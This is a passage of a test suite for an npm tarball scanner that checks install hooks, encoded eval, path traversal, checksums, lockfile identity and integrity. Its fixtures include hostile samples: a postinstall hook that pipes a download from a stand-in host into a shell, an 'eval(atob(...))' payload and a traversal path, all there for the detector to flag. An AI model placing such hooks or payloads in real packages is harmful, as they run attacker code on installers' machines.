        fetchImpl: async () => new Response(archive, { status: 200 })
      }
    );
    expect(result).toMatchObject({
      reasons: [],
      coverage: {
        checked: 1,
        files: 1,
        binaryFiles: 0,
        networkBytes: archive.length
      }
    });
    expect(result.verifiedArtifactSha256ByLocation).toEqual({
      [location]: createHash('sha256').update(archive).digest('hex')
    });
  });

  it('scans exact npm tarball contents without extraction and flags install hooks', () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({
          name: 'example',
          version: '2.0.0',
          scripts: { postinstall: 'curl https://evil.invalid/a | sh' }
        })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    const result = inspectNpmTarball(
      archive,
      artifact(archive, { hasInstallScript: true })
    );
    expect(result.findings).toContain(
      'artifact:node_modules/example/package.json#scripts.postinstall'
    );
    expect(result.reasons).toContain(
      'dependency-lifecycle-script-review:node_modules/example'
    );
  });

  it('uses the verified package manifest as the source of truth for optional install metadata', () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ]
    ]);
    const result = inspectNpmTarball(
      archive,
      artifact(archive, { hasInstallScript: true })
    );
    expect(result.reasons).not.toContain('lifecycle-metadata-mismatch');
    expect(result.reasons).not.toContain(
      'dependency-lifecycle-script-review:node_modules/example'
    );
  });

  it('accepts verified package archives with a package-specific top-level directory', () => {
    const archive = npmTarball([
      [
        'node v22.20/package.json',
        JSON.stringify({ name: '@types/node', version: '22.20.1' })
      ],
      ['node v22.20/index.d.ts', 'export declare const value: string;']
    ]);
    const result = inspectNpmTarball(
      archive,
      artifact(archive, {
        name: '@types/node',
        version: '22.20.1'
      })
    );
    expect(result.reasons).not.toContain('tar-path-outside-package-root');
    expect(result.reasons).not.toContain('artifact-package-manifest-missing');
    expect(result.reasons).not.toContain('artifact-package-identity-mismatch');
    expect(result.files).toBe(2);
  });

  it('continues archive inspection after a large binary entry', () => {
    const archive = npmTarball([
      ['package/bin/tool', Buffer.alloc(3 * 1024 * 1024, 0xa5)],
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    const result = inspectNpmTarball(archive, artifact(archive));
    expect(result.files).toBe(3);
    expect(result.binaryFiles).toBe(1);
    expect(result.reasons).toContain('artifact-binary-content-uninspected');
    expect(result.reasons).not.toContain('artifact-file-size-exceeded');
    expect(result.reasons).not.toContain('artifact-package-manifest-missing');
    expect(result.reasons).not.toContain('tar-terminator-missing');
  });

  it('treats benign dependency code generation and inert package content as noise', () => {
    const safeArchive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      [
        'package/index.js',
        'export const identity = function(value) { return value; };'
      ],
      [
        'package/another.js',
        'export const make = function() { return () => true; };'
      ]
    ]);
    expect(
      inspectNpmTarball(safeArchive, artifact(safeArchive)).findings
    ).toEqual([]);

    const codegenArchive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      [
        'package/index.js',
        'export const compile = new Function(' +
          '`return $' +
          '{schema}`' +
          ');'
      ],
      ['package/test/compiler.test.js', 'eval(testExpression);'],
      ['package/README.md', 'The parser uses eval(expression) internally.'],
      ['package/lib/index.js.map', '{"sourcesContent":["eval(payload)"]}'],
      [
        'package/lib/launcher.js',
        "spawnSync(command, args, { shell: false, env: { PATH: process.env.PATH }, windowsHide: true, url: 'https://nodejs.org' });"
      ],
      [
        'package/lib/gyp-parser.py',
        'eval(open(build_file).read(), safe_globals)'
      ],
      ['package/lib/lib.es5.d.ts', 'declare function eval(x: string): any;'],
      [
        'package/examples/client.js',
        "import { spawn } from 'node:child_process'; spawn(process.env.TOOL, []);"
      ]
    ]);
    expect(
      inspectNpmTarball(codegenArchive, artifact(codegenArchive)).findings
    ).toEqual([]);
  });

  it('continues to block decoded dynamic execution in dependency archives', () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      ['package/index.js', 'eval(atob(encodedPayload));']
    ]);
    expect(inspectNpmTarball(archive, artifact(archive)).findings).toContain(
      'artifact:node_modules/example/index.js'
    );
  });

  it('does not treat package-owned workflows as active repository workflows', () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '1.0.0' })
      ],
      [
        'package/.github/workflows/publish.yml',
        [
          'name: publish',
          'on: release',
          'jobs:',
          '  publish:',
          '    steps:',
          '      - run: npm publish',
          '        env:',
          fixtureSource(
            '          NODE_AUTH_TOKEN: ${{',
            ' secrets.NPM_TOKEN }}'
          )
        ].join('\n')
      ]
    ]);
    expect(inspectNpmTarball(archive, artifact(archive)).findings).toEqual([]);
  });

  it('fails closed on traversal names and invalid tar checksums', () => {
    const traversal = npmTarball([['package/../../outside.js', 'eval(1)']]);
    expect(inspectNpmTarball(traversal, artifact(traversal)).reasons).toContain(
      'tar-path-invalid'
    );
    const validArchive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ]
    ]);
    const invalidTar = gunzipSync(validArchive);
    invalidTar[100] = (invalidTar[100] ?? 0) ^ 1;
    const badChecksum = gzipSync(invalidTar);
    expect(
      inspectNpmTarball(badChecksum, artifact(badChecksum)).reasons
    ).toContain('tar-header-checksum-invalid');
  });

  it('binds registry tarball identity to the exact lockfile package, including aliases', async () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: '@public/real-package', version: '2.0.0' })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    expect(
      inspectNpmTarball(
        archive,
        artifact(archive, {
          name: '@public/other-package',
          version: '2.0.0'
        })
      ).reasons
    ).toContain('artifact-package-identity-mismatch');
    expect(
      inspectNpmTarball(archive, artifact(archive, { version: '2.0.1' }))
        .reasons
    ).toContain('artifact-package-identity-mismatch');

    const integrity = `sha512-${createHash('sha512').update(archive).digest('base64')}`;
    const lock = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': {},
        'node_modules/alias': {
          name: '@public/real-package',
          version: '2.0.0',
          resolved:
            'https://registry.npmjs.org/@public/real-package/-/real-package-2.0.0.tgz',
          integrity
        }
      }
    });
    const inventory = parseNpmLockInventory(lock);
    expect(inventory.records.get('node_modules/alias')).toMatchObject({
      name: '@public/real-package',
      version: '2.0.0'
    });
    const renamedIdentity = JSON.parse(lock) as {
      packages: Record<string, Record<string, unknown>>;
    };
    const aliasedPackage = renamedIdentity.packages['node_modules/alias'];
    if (!aliasedPackage) throw new Error('fixture alias package is missing');
    aliasedPackage.name = '@public/other-package';
    expect(
      compareNpmLockfiles(lock, JSON.stringify(renamedIdentity), '{}')
        .changedArtifacts
    ).toBe(1);
    let requests = 0;
    const fetchImpl = async () => {
      requests++;
      return new Response(archive, { status: 200 });
    };
    const withheld = await inspectNpmArtifacts(
      [...inventory.records.values()],
      { fetchImpl }
    );
    expect(withheld.reasons).toContain(
      'scoped-artifact-fetch-withheld:node_modules/alias'
    );
    expect(requests).toBe(0);
    const checked = await inspectNpmArtifacts([...inventory.records.values()], {
      allowedPublicScopes: ['@public'],
      fetchImpl
    });
    expect(checked.coverage.checked).toBe(1);
    expect(checked.reasons).toEqual([]);
    expect(checked.verifiedArtifactSha512ByLocation).toEqual({
      'node_modules/alias': createHash('sha512').update(archive).digest('hex')
    });
  });

  it('verifies tarball integrity and never queries unapproved scoped packages', async () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    let requests = 0;
    const fetchImpl = async () => {
      requests++;
      return new Response(archive, { status: 200 });
    };
    const checked = await inspectNpmArtifacts([artifact(archive)], {
      fetchImpl
    });
    expect(checked.coverage.checked).toBe(1);
    expect(checked.reasons).toEqual([]);

    const scoped = await inspectNpmArtifacts(
      [
        artifact(archive, {
          name: '@private/example',
          location: 'node_modules/@private/example'
        })
      ],
      { fetchImpl }
    );
    expect(scoped.reasons).toContain(
      'scoped-artifact-fetch-withheld:node_modules/@private/example'
    );
    expect(requests).toBe(1);

    const tampered = await inspectNpmArtifacts(
      [artifact(archive, { integrity: `sha512-${'A'.repeat(88)}` })],
      { fetchImpl }
    );
    expect(tampered.reasons).toContain(
      'artifact-integrity-mismatch:node_modules/example'
    );
  });
});
